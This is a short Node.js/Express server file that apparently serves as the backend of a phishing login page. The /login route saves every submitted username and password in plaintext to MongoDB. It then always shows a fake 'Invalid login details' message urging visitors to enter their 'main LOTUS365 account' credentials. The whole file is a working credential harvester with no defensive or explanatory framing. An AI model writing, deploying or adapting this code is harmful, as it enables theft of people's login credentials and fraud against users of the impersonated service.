require('dotenv').config();

const express = require('express');
const mongoose = require('mongoose');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("MongoDB Connected"))
  .catch(err => console.log("DB Error:", err));

// Schema: only username + password
const Login = mongoose.model('Login', {
  username: String,
  password: String
});

// Serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle login form submission
app.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    // Save username + password
    await Login.create({ username, password });

    // Custom message
    res.send(`
      <h2 style="text-align:center; color:red; margin-top:100px;">
       "Invalid login details. Please try again. For full access to all markets,
        kindly log in using your main LOTUS365 account username and password."
      </h2>
    `);

  } catch (err) {
    console.log(err);
    res.send("Error");
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});
